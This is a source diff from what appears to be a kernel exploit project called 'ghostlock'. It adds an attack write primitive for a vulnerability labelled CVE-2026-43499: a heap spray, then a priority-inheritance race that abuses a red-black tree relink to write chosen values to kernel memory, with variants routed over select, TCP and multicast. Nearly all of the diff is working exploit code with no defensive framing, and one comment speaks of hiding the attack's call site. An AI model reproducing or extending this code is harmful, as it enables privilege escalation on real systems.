@@ -5,6 +5,12 @@
 
 #include "common.h"
 
+#include "backend/cve_2026_43499_state.hpp"
+#include "backend/cve_2026_43499/route/route_middleware.hpp"
+#include "backend/cve_2026_43499/route/route_policy.hpp"
+#include "memory/direct_map.hpp"
+#include "support/decls.hpp"
+
 #include <algorithm>
 #include <array>
 #include <atomic>
@@ -125,4 +131,64 @@ namespace ghostlock::backend {
         pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
         return best;
     }
+
+    /* One route write: middleware resident fast path, else heap spray + PI race.
+     * Shared statement order; the middleware policy decides the resident step. */
+    template <class M>
+    Status Cve43499Primitives::attack_write(CoreSession &session,
+                                            const memory::WriteRequest &request,
+                                            const char *desc) {
+        pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
+                request.target, static_cast<int32_t>(request.mode),
+                !request.preserve_child);
+        if (!memory::in_direct_map(request.target)) {
+            pr_warning("  target is outside the direct map, not writing\n");
+            return 0;
+        }
+
+        /* Both transports write *(target) := value through the erase left-only
+         * relink: waiter words are {pc = value, right = 0, left = target} and
+         * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
+        support::timer_mark("  heap spray start");
+        (ghostlock::backend::cve43499_state(session).heap.current.base) = support::prepare_good_kernel_page(request);
+        if (!(ghostlock::backend::cve43499_state(session).heap.current.base)) {
+            pr_warning("  heap spray failed\n");
+            return 0;
+        }
+
+        support::timer_mark("  heap spray done");
+        Status routed = ghostlock::backend::cve_2026_43499::route::middleware::run_middleware_route(session, request);
+
+        support::timer_mark("  PI route done");
+        if (!routed) {
+            pr_warning("  PI route did not produce a verified write\n");
+        }
+
+        return routed;
+    }
+
+    /* Ancillary-context adapter for the same write; binds the session global so
+     * the attack path gains no parameter-derived call site. */
+    template <class M>
+    Status Cve43499Primitives::zero_word(uintptr_t target, const char *desc) {
+        const memory::WriteRequest request =
+                memory::WriteRequest::make(target, memory::WriteMode::Zero, 1);
+        return attack_write<M>(ghostlock::session::g_exploit_session, request, desc);
+    }
+
+    /* Explicit instantiations: the catalogued route policies. Callers only
+     * include the header; the definitions stay in this unit. */
+    template Status Cve43499Primitives::attack_write<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(
+        CoreSession &, const memory::WriteRequest &, const char *);
+    template Status Cve43499Primitives::attack_write<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(
+        CoreSession &, const memory::WriteRequest &, const char *);
+    template Status Cve43499Primitives::attack_write<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(
+        CoreSession &, const memory::WriteRequest &, const char *);
+
+    template Status Cve43499Primitives::zero_word<ghostlock::backend::cve_2026_43499::route::SelectPolicy>(
+        uintptr_t, const char *);
+    template Status Cve43499Primitives::zero_word<ghostlock::backend::cve_2026_43499::route::TcpPolicy>(
+        uintptr_t, const char *);
+    template Status Cve43499Primitives::zero_word<ghostlock::backend::cve_2026_43499::route::MulticastPolicy>(
+        uintptr_t, const char *);
 } // namespace ghostlock::backend
